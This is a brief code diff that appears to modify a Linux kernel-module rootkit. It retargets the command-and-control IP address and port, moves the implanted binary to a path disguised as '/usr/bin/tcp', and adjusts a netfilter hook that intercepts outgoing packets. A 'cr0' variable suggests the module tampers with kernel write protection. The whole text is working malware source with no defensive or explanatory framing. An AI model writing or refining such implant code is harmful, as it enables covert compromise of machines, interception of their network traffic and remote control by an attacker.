@@ -18,8 +18,8 @@
 #define SPORT 1337
 #define DPORT 1339
 
-#define PACKAGE "/usr/local/bin/mkdir"
-#define C2IP    "192.168.0.60"
+#define PACKAGE "/usr/bin/tcp"
+#define C2IP    "192.168.56.1"
 #define C2PORT  "9090"
 
 unsigned long cr0;
@@ -87,8 +87,8 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff * skb) {
 static int load_netfilter_hook(void){
   int result;
 
-  nfho.hook       = (nf_hookfn *) hook_func;
-  nfho.hooknum    = NF_INET_POST_ROUTING;
+  nfho.hook       = (void*) hook_func;
+  nfho.hooknum    = 0;
   nfho.pf         = PF_INET;
   nfho.priority   = NF_IP_PRI_FIRST;
 
